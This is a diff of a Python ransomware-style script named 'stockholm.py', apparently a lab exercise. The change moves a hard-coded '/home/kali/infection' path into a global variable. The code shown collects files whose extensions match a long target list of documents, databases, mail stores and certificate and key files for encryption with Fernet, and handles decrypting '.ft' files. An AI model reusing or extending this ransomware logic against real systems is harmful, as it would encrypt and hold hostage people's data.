@@ -5,11 +5,12 @@ from cryptography.fernet import Fernet
 import os
 from colorama import Fore, Back, Style
 
+infection_path = '/home/kali/infection'
+
 def	get_files():
 	files = []
 	no_encrypt = []
 	directorys = []
-	encrypt_path = '/home/kali/infection'
 	ext_to_encrypt = ['.der','.pfx','.crt','.csr','.p12','.pem','.odt','.ott','.sxw','.uot','.3ds','.max',
 	'.3dm','.ods','.ots','.sxc','.stc','.dif','.slk','.wb2','.odp','.otp','.sxd','.std','.uop','.odg','.otg','.sxm'
 	,'.mml' ,'.lay','.lay6','.asc','.sqlite3','.sqlitedb','.sql','.accdb','.mdb','.db','.dbf','.odb','.frm','.myd'
@@ -22,28 +23,28 @@ def	get_files():
 	,'.123','.rtf','.csv','.txt','.vsdx','.vsd','.edb','.eml','.msg','.ost','.pst','.potm','.potx','.ppam','.ppsx'
 	,'.ppsm','.pps','.pot','.pptm','.pptx','.ppt','.xltm','.xltx','.xlc','.xlm','.xlt','.xlw','.xlsb','.xlsm'
 	,'.xlsx','.xls','.dotx','.dotm','.dot','.docm','.docb','.docx','.doc']
-	if os.path.exists(encrypt_path) == False:
-		os.mkdir(encrypt_path)
+	if os.path.exists(infection_path) == False:
+		os.mkdir(infection_path)
 		if len(sys.argv) == 1:
 			print(Back.RED, Fore.YELLOW, "🦠 The directory 'infection' doesn't exist, so it has been created empty. If you want to encrypt files, you will have to fill it in.", Style.RESET_ALL)
 		exit()
-	if os.path.isfile(encrypt_path):
+	if os.path.isfile(infection_path):
 		print(Fore. YELLOW, "Cannot create a 'infection' directory, there is a file with the same name.", Style.RESET_ALL)
 		exit()
 	try:
-		for file in os.listdir(encrypt_path):
+		for file in os.listdir(infection_path):
 			if file == "stockholm.py":
 				continue
-			filename, file_extension = os.path.splitext(encrypt_path + '/' + file)
-			if os.path.isfile(encrypt_path + '/' + file):
+			filename, file_extension = os.path.splitext(infection_path + '/' + file)
+			if os.path.isfile(infection_path + '/' + file):
 				if file_extension in ext_to_encrypt:
-					files.append(encrypt_path + '/' + file)
+					files.append(infection_path + '/' + file)
 				else:
-					no_encrypt.append(encrypt_path + '/' + file)
+					no_encrypt.append(infection_path + '/' + file)
 			else:
-				directorys.append(encrypt_path + '/' + file)
+				directorys.append(infection_path + '/' + file)
 	except:
-		print(Fore.YELLOW, "You dont have permissions on the directory:", encrypt_path, Style.RESET_ALL)
+		print(Fore.YELLOW, "You dont have permissions on the directory:", infection_path, Style.RESET_ALL)
 		exit()
 	if len(sys.argv) == 1 and len(no_encrypt) > 0:
 		print(Back.RED, Fore.YELLOW, "📄 Files that cannot be encrypt because of the extension:", Style.RESET_ALL)
@@ -91,18 +92,17 @@ def	encrypt(files, key):
 
 def desencrypt():
 
-	desencrypt_path = '/home/kali/infection'
 	desencrypt_files = []
-	if os.path.exists(desencrypt_path) == False:
+	if os.path.exists(infection_path) == False:
 		print(Fore.YELLOW, "🤔 The path to decrypt doesn't exist... Did you remove the directory?", Style.RESET_ALL)
 		exit()
-	if os.path.isfile(desencrypt_path):
-		print(Fore.YELLOW, "/home/kali/infection is a file not a directory...", Style.RESET_ALL)
+	if os.path.isfile(infection_path):
+		print(Fore.YELLOW, infection_path, "is a file not a directory...", Style.RESET_ALL)
 		exit()
-	for file in os.listdir(desencrypt_path):
-		filename, file_extension = os.path.splitext(desencrypt_path + '/' + file)
+	for file in os.listdir(infection_path):
+		filename, file_extension = os.path.splitext(infection_path + '/' + file)
 		if file_extension == ".ft":
-			desencrypt_files.append(desencrypt_path + '/' + file)
+			desencrypt_files.append(infection_path + '/' + file)
 	if len(desencrypt_files) == 0:
 		print(Fore.YELLOW, "😵 There is no files to decrypt... Did you remove the files?", Style.RESET_ALL)
 		return
